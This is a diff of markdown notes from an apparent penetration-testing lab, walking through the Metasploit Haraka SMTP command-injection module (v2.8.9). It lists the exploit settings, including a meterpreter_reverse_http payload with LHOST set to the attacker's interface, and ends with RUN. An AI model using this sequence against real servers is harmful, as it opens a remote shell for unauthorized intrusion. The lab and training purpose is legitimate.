@@ -25,11 +25,15 @@ Haraka versions V2.8.9 are vulnerable to command injection.
 [*] Nmap: MAC Address: 02:42:C0:56:33:03 (Unknown)
 ```
 ### exploit
->>>>linux/smtp/haraka
->>>>set SRV_PRT 9898
->>>>set email_to root@attackdefence.text
->>>>> set Payload linux/x64/meterpreter_reverse_http  
-\THIS IS A STAGELESS PAYLOAD
->>>>set LHOST **<eth1>**
+>>>linux/smtp/haraka
+>>>set SRV_PRT 9898
+>>>set email_to root@attackdefence.text
+>>>set Payload linux/x64/meterpreter_reverse_http  
+```bash
+THIS IS A STAGELESS PAYLOAD
+```
+>>>set LHOST **<eth1>**
+>>>```bash
 *tHIS NEEDS 8080 THATS WHY WE CHANGED SRV_PORT TO DIFFERENT ONE*
->>>>> RUN
+```
+>>> RUN
